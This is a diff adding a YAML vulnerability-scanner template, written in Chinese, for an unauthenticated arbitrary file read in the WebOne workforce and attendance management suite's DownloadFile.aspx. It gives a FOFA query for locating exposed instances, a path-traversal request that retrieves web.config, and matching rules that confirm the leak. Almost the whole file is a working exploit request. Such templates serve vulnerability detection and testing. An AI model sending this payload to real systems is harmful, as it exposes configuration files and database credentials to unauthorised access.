@@ -1,0 +1,25 @@
+id: webone-downloadfile-fileread
+
+info:
+  name: WebOne劳动力与考勤管理套件DownloadFile.aspx任意文件读取漏洞
+  author: avic123
+  severity: medium
+  verified: true
+  description: |
+    WebOne劳动力与考勤管理软件的/webForms/Download/DownloadFile.aspx接口存在任意文件读取漏洞，未经身份验证的攻击者可以通过该漏洞获取数据库敏感信息
+    fofa："劳动力管理软件平台"
+  reference:
+    - https://cn-sec.com/archives/4237742.html
+  tags: webone,fileread
+  created: 2025/08/26
+
+set:
+  hostname: request.url.host
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /webForms/Download/DownloadFile.aspx?fileid=/../../web.config&flag=report
+    expression: response.status == 200 && response.body.bcontains(b'xml version=')&& response.body.bcontains(b'publicKeyToken=')
+expression: r0()
